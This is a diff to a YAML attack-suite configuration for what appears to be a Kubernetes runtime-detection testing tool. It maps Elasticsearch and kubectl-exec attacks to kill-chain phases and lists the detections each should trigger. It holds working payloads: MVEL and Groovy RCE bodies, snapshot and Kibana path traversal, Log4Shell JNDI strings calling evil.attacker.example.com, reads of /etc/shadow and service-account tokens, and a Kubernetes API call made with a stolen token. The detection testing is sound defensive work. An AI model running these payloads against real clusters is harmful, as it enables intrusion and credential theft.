@@ -1,75 +1,59 @@
 apiVersion: bobctl.k8sstormcenter.io/v1alpha1
 kind: AttackSuite
 metadata:
-  name: elk-attacks
+  name: elk-killchain-attacks
   description: >-
-    Attack suite for the Elastic stack. Targets the Elasticsearch REST API
-    to exercise security-relevant behaviors that node-agent should detect:
-    unexpected process execution, sensitive file access, data exfiltration
-    via API, and cluster manipulation.
-
-    Elasticsearch runs as a Java process (OpenJDK) in the ECK-managed container.
-    The attack surface is the unauthenticated REST API on port 9200.
+    Kill-chain ordered Elastic stack attack suite (30 attacks) using TWO
+    delivery mechanisms: Elasticsearch REST API abuse and kubectl exec
+    post-exploitation. Includes CVE-based exploits: CVE-2014-3120 (MVEL),
+    CVE-2015-1427 (Groovy), CVE-2015-5531 (snapshot traversal),
+    CVE-2021-44228 (Log4Shell), CVE-2018-17246 (Kibana LFI). Covers OWASP
+    A01 (Broken Access Control), A03 (Injection), A05 (Misconfiguration).
 target:
   service: el-es-http
   namespace: elk
   port: 9200
 
 attacks:
-  # --- Data exfiltration via API ---
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 1: RECONNAISSANCE (TA0043) — API enumeration
+  # ═══════════════════════════════════════════════════════════════════════════
 
-  - name: exfil-cluster-settings
+  # T1082 — System Information Discovery (cluster info)
+  - name: recon-cluster-settings
     type: ssrf
     http:
       method: GET
       path: /_cluster/settings?include_defaults=true&flat_settings=true
     successIndicators:
       - statusCode: 200
+    expectedDetections: []
 
-  - name: exfil-all-indices
+  # T1083 — File and Directory Discovery (index enumeration)
+  - name: recon-all-indices
     type: ssrf
     http:
       method: GET
       path: /_cat/indices?v&h=index,docs.count,store.size
     successIndicators:
       - statusCode: 200
+    expectedDetections: []
 
-  - name: exfil-mapping-dump
+  # T1082 — System Information Discovery (mapping dump)
+  - name: recon-mapping-dump
     type: ssrf
     http:
       method: GET
       path: /_all/_mapping
     successIndicators:
       - statusCode: 200
+    expectedDetections: []
 
-  # --- Dangerous cluster manipulation ---
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 3: EXECUTION (TA0002) — Script execution and post-exploitation
+  # ═══════════════════════════════════════════════════════════════════════════
 
-  - name: snapshot-repo-create
-    type: ssrf
-    http:
-      method: PUT
-      path: /_snapshot/exfil-repo
-      headers:
-        Content-Type: application/json
-      body: '{"type":"fs","settings":{"location":"/tmp/exfil-snapshot"}}'
-    successIndicators:
-      - statusCode: 200
-      - statusCode: 500
-
-  - name: reindex-exfil
-    type: ssrf
-    http:
-      method: POST
-      path: /_reindex
-      headers:
-        Content-Type: application/json
-      body: '{"source":{"index":"*","size":1},"dest":{"index":"bobctl-exfil-test"}}'
-    successIndicators:
-      - statusCode: 200
-      - statusCode: 400
-
-  # --- Scripting abuse (Painless) ---
-
+  # T1059 — Painless script execution (Runtime access attempt)
   - name: painless-script-exec
     type: cmdinject
     http:
@@ -92,7 +76,9 @@ attacks:
       - statusCode: 200
       - statusCode: 400
       - statusCode: 500
+    expectedDetections: []
 
+  # T1059 — Painless runtime field injection
   - name: painless-runtime-field
     type: cmdinject
     http:
@@ -114,56 +100,412 @@ attacks:
     successIndicators:
       - statusCode: 200
       - statusCode: 400
+    expectedDetections: []
 
-  # --- Exec attacks (post-exploitation) ---
-
+  # T1059.004 — Unix Shell (whoami)
   - name: exec-whoami
     type: cmdinject
     exec:
       command: ["whoami"]
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: elasticsearch
+        command: whoami
 
+  # T1059.004 — Unix Shell (exec from /dev/shm)
+  - name: exec-devshm
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "cp /bin/echo /dev/shm/malicious_elk && chmod +x /dev/shm/malicious_elk && /dev/shm/malicious_elk pwned && rm -f /dev/shm/malicious_elk"]
+    expectedDetections: []
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 6: DEFENSE EVASION (TA0005) — Cover tracks
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # T1036 — Masquerading: drifted binary
+  - name: exec-drifted-binary
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "cp /bin/ls /tmp/drifted_elk && /tmp/drifted_elk /etc && rm -f /tmp/drifted_elk"]
+    expectedDetections: []
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 7: CREDENTIAL ACCESS (TA0006) — Steal secrets
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # T1552.001 — Credentials in Files: SA token
   - name: exec-sa-token
     type: cmdinject
     exec:
       command: ["cat", "/var/run/secrets/kubernetes.io/serviceaccount/token"]
+    expectedDetections:
+      - ruleID: R0006
+        ruleName: Unexpected Service Account Token Access
+        containerName: elasticsearch
+        command: cat
 
+  # T1552.001 — Credentials in Files: /etc/shadow
   - name: exec-etc-shadow
     type: cmdinject
     exec:
       command: ["cat", "/etc/shadow"]
+    expectedDetections: []
 
+  # T1552.001 — Credentials in Files: /etc/passwd
   - name: exec-etc-passwd
     type: cmdinject
     exec:
       command: ["cat", "/etc/passwd"]
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: elasticsearch
+        command: cat
 
-  - name: exec-drifted-binary
+  # T1552 — Symlink to access sensitive file
+  - name: exec-symlink
     type: cmdinject
     exec:
-      command: ["sh", "-c", "cp /bin/ls /tmp/drifted_elk && /tmp/drifted_elk /etc; rm -f /tmp/drifted_elk"]
+      command: ["sh", "-c", "ln -sf /etc/shadow /tmp/shadow_link && cat /tmp/shadow_link && rm -f /tmp/shadow_link"]
+    expectedDetections: []
 
-  - name: exec-env-dump
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 8: DISCOVERY (TA0007) — Environment enumeration
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # T1082 — System Information Discovery: /proc/environ
+  - name: exec-proc-environ
     type: cmdinject
     exec:
-      command: ["env"]
+      command: ["cat", "/proc/1/environ"]
+    expectedDetections:
+      - ruleID: R0008
+        ruleName: Read Environment Variables from procfs
+        containerName: elasticsearch
+        command: cat
 
-expectedDetections:
-  - attackType: cmdinject
-    ruleID: R0001
-    ruleName: "Unexpected process launched"
-    command: whoami
+  # T1046 — Network Service Discovery: resolv.conf and hosts
+  - name: exec-net-recon
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "cat /etc/resolv.conf && cat /etc/hosts"]
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: elasticsearch
+        command: cat
 
-  - attackType: cmdinject
-    ruleID: R0001
-    ruleName: "Unexpected process launched"
-    command: cat
+  # T1613 — Container and Resource Discovery: K8s API enum
+  - name: exec-k8s-api-enum
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) && curl -sk -H \"Authorization: Bearer $TOKEN\" https://kubernetes.default.svc/api 2>&1 | head -5"]
+    expectedDetections: []
 
-  - attackType: cmdinject
-    ruleID: R0010
-    ruleName: "Unexpected Sensitive File Access"
-    command: cat
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 9: LATERAL MOVEMENT (TA0008) — Snapshot-based pivot
+  # ═══════════════════════════════════════════════════════════════════════════
 
-  - attackType: cmdinject
-    ruleID: R1001
-    ruleName: "Drifted process executed"
-    command: drifted_elk
+  # T1021 — Remote Services: snapshot repo for data staging
+  - name: snapshot-repo-create
+    type: ssrf
+    http:
+      method: PUT
+      path: /_snapshot/exfil-repo
+      headers:
+        Content-Type: application/json
+      body: '{"type":"fs","settings":{"location":"/tmp/exfil-snapshot"}}'
+    successIndicators:
+      - statusCode: 200
+      - statusCode: 500
+    expectedDetections: []
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 10: COLLECTION (TA0009) — Data harvesting
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # T1005 — Data from Local System: reindex all data
+  - name: reindex-exfil
+    type: ssrf
+    http:
+      method: POST
+      path: /_reindex
+      headers:
+        Content-Type: application/json
+      body: '{"source":{"index":"*","size":1},"dest":{"index":"bobctl-exfil-test"}}'
+    successIndicators:
+      - statusCode: 200
+      - statusCode: 400
+    expectedDetections: []
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 11: EXFILTRATION (TA0010) — DNS exfil signals
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # T1048 — Exfiltration Over Alternative Protocol: DNS beacon
+  - name: exec-dns-anomaly
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "getent hosts evil.attacker.example.com || echo dns_failed"]
+    expectedDetections: []
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 12: IMPACT (TA0040) — Crypto mining signals
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # T1496 — Resource Hijacking: crypto mining DNS signal
+  - name: exec-crypto-dns
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "getent hosts xmr.pool.minergate.com || echo mining_dns_failed"]
+    expectedDetections:
+      - ruleID: R1008
+        ruleName: Crypto Mining Domain Communication
+        containerName: elasticsearch
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # CVE-BASED ATTACKS — Historical Elasticsearch vulnerabilities
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # CVE-2014-3120 — MVEL scripting RCE (Elasticsearch < 1.2)
+  # Severity: Critical (CVSS 9.8). Dynamic scripting enabled by default,
+  # allows arbitrary Java code execution via _search API.
+  # Exploited by Linux/Mayday DDoS botnet and crypto miners.
+  - name: cve-2014-3120-mvel-rce
+    type: cmdinject
+    http:
+      method: POST
+      path: /bobctl-attack-test/_search
+      headers:
+        Content-Type: application/json
+      body: >-
+        {
+          "query": {
+            "filtered": {
+              "query": {"match_all": {}},
+              "filter": {
+                "script": {
+                  "script": "import java.lang.Runtime; Runtime rt = Runtime.getRuntime(); rt.exec('id')"
+                }
+              }
+            }
+          }
+        }
+    successIndicators:
+      - statusCode: 200
+      - statusCode: 400
+      - statusCode: 500
+    expectedDetections: []
+
+  # CVE-2015-1427 — Groovy sandbox escape (Elasticsearch 1.3.x-1.4.x)
+  # Severity: Critical (CVSS 9.8). Groovy sandbox bypass allows arbitrary
+  # code execution. Mass-exploited for crypto mining and DDoS botnets.
+  - name: cve-2015-1427-groovy-escape
+    type: cmdinject
+    http:
+      method: POST
+      path: /bobctl-attack-test/_search
+      headers:
+        Content-Type: application/json
+      body: >-
+        {
+          "query": {
+            "script_score": {
+              "query": {"match_all": {}},
+              "script": {
+                "lang": "groovy",
+                "source": "java.lang.Math.class.forName('java.lang.Runtime').getRuntime().exec('id').text"
+              }
+            }
+          }
+        }
+    successIndicators:
+      - statusCode: 200
+      - statusCode: 400
+      - statusCode: 500
+    expectedDetections: []
+
+  # CVE-2015-5531 — Snapshot directory traversal
+  # Severity: Medium (CVSS 5.3). Read arbitrary files via snapshot API
+  # path traversal. Requires snapshot repo configured.
+  - name: cve-2015-5531-snapshot-traversal
+    type: ssrf
+    http:
+      method: GET
+      path: /_snapshot/exfil-repo/%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+    successIndicators:
+      - statusCode: 200
+      - statusCode: 400
+      - statusCode: 404
+    expectedDetections: []
+
+  # CVE-2021-44228 — Log4Shell JNDI lookup (Elasticsearch uses log4j)
+  # Severity: Critical (CVSS 10.0). The most impactful Java CVE in history.
+  # ES 7.x bundles log4j-core. Probe via search query that triggers logging.
+  - name: cve-2021-44228-log4shell-probe
+    type: cmdinject
+    http:
+      method: POST
+      path: /bobctl-attack-test/_search
+      headers:
+        Content-Type: application/json
+        X-Forwarded-For: "${jndi:ldap://evil.attacker.example.com:1389/exploit}"
+        User-Agent: "${jndi:ldap://evil.attacker.example.com:1389/exploit}"
+      body: >-
+        {
+          "query": {
+            "match": {
+              "message": "${jndi:ldap://evil.attacker.example.com:1389/exploit}"
+            }
+          }
+        }
+    successIndicators:
+      - statusCode: 200
+      - statusCode: 400
+    expectedDetections: []
+
+  # CVE-2021-44228 — Log4Shell via index name
+  - name: cve-2021-44228-log4shell-index
+    type: cmdinject
+    http:
+      method: PUT
+      path: /${jndi:ldap://evil.attacker.example.com/a}
+      headers:
+        Content-Type: application/json
+      body: "{}"
+    successIndicators:
+      - statusCode: 200
+      - statusCode: 400
+    expectedDetections: []
+
+  # CVE-2018-17246 — Kibana LFI via timelion (if Kibana exposed)
+  # Severity: Critical (CVSS 9.8). Local file inclusion in Kibana's
+  # timelion or console endpoints.
+  - name: cve-2018-17246-kibana-lfi-probe
+    type: ssrf
+    http:
+      method: GET
+      path: /api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../../etc/passwd
+    successIndicators:
+      - statusCode: 200
+      - statusCode: 400
+      - statusCode: 404
+    expectedDetections: []
+
+  # T1059 — Painless script with Runtime.exec attempt
+  # Modern ES blocks Runtime access, but we test the boundary.
+  - name: painless-runtime-exec-probe
+    type: cmdinject
+    http:
+      method: POST
+      path: /bobctl-attack-test/_update_by_query
+      headers:
+        Content-Type: application/json
+      body: >-
+        {
+          "script": {
+            "source": "def x = Runtime.getRuntime().exec('id'); ctx._source.hacked = true",
+            "lang": "painless"
+          },
+          "query": {"match_all": {}}
+        }
+    successIndicators:
+      - statusCode: 200
+      - statusCode: 400
+      - statusCode: 500
+    expectedDetections: []
+
+  # T1005 — _reindex from remote source (SSRF)
+  # Can exfiltrate data from internal ES clusters or probe internal network.
+  - name: reindex-remote-ssrf
+    type: ssrf
+    http:
+      method: POST
+      path: /_reindex
+      headers:
+        Content-Type: application/json
+      body: >-
+        {
+          "source": {
+            "remote": {
+              "host": "http://kubernetes.default.svc:9200",
+              "socket_timeout": "2s",
+              "connect_timeout": "2s"
+            },
+            "index": "secret-data"
+          },
+          "dest": {
+            "index": "bobctl-ssrf-test"
+          }
+        }
+    successIndicators:
+      - statusCode: 200
+      - statusCode: 400
+      - statusCode: 500
+    expectedDetections: []
+
+  # T1190 — _render/template SSTI (Server-Side Template Injection)
+  # Older ES versions allowed Mustache template injection.
+  - name: es-template-injection
+    type: ssrf
+    http:
+      method: POST
+      path: /_render/template
+      headers:
+        Content-Type: application/json
+      body: >-
+        {
+          "source": "{{#toJson}}ctx{{/toJson}}",
+          "params": {
+            "ctx": {"key": "{{#ctx}}{{/ctx}}"}
+          }
+        }
+    successIndicators:
+      - statusCode: 200
+      - statusCode: 400
+    expectedDetections: []
+
+  # T1059 — Watcher/Alerting execute command (if X-Pack available)
+  - name: es-watcher-exec-probe
+    type: ssrf
+    http:
+      method: PUT
+      path: /_watcher/watch/bob-attack-watch
+      headers:
+        Content-Type: application/json
+      body: >-
+        {
+          "trigger": {"schedule": {"interval": "1h"}},
+          "input": {"http": {"request": {"url": "http://evil.attacker.example.com/callback", "method": "get"}}},
+          "actions": {"log_it": {"logging": {"text": "bob-attack-triggered"}}}
+        }
+    successIndicators:
+      - statusCode: 200
+      - statusCode: 400
+      - statusCode: 404
+    expectedDetections: []
+
+  # T1059 — Ingest pipeline with script processor
+  - name: es-ingest-script-exec
+    type: ssrf
+    http:
+      method: PUT
+      path: /_ingest/pipeline/bob-attack-pipeline
+      headers:
+        Content-Type: application/json
+      body: >-
+        {
+          "processors": [
+            {
+              "script": {
+                "source": "ctx.hacked = true; ctx.hostname = InetAddress.getLocalHost().getHostName()"
+              }
+            }
+          ]
+        }
+    successIndicators:
+      - statusCode: 200
+      - statusCode: 400
+    expectedDetections: []
